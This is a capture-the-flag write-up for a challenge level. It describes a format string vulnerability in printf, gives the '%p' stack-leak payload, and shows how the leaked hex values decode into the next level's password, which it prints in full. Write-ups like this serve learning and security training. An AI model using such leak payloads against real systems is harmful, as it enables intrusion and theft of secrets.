# Level02

## Description
In this level, the program asks the user for a username and a password.  
The real password is read from `/home/users/level03/.pass` and stored in the variable `local_a8`.

It then compares the user input to the real password.

If the password is correct, the program prints a greeting and opens a shell. Otherwise, the program prints the username followed by "does not have access!"

## Key Vulnerability
We cannot use ltrace, gdb, or similar tools to read the memory.

However, the username is printed using : 
```
printf(local_78);
```

This is a format string vulnerability, because the format is not specified.
It allows us to leak stack data by inputting:
```
"%p " * 30
```
This prints the first 30 addresses on the stack.


Among those, we can spot 5 values that look like ASCII strings in hexadecimal:
```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```

Reversing each 8-byte block and converting to ASCII gives:
```
0x756e505234376848 -> unPR47hH -> Hh74RPnu
0x45414a3561733951 -> EAJ5as9Q -> Q9sa5JAE
0x377a7143574e6758 -> 7zqCWNgX -> XgNWCqz7
0x354a35686e475873 -> 5J5hnGXs -> sXGnh5J5
0x48336750664b394d -> H3gPfK9M -> M9KfPg3H
```

## Password

Concatenating these gives us the real password:
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```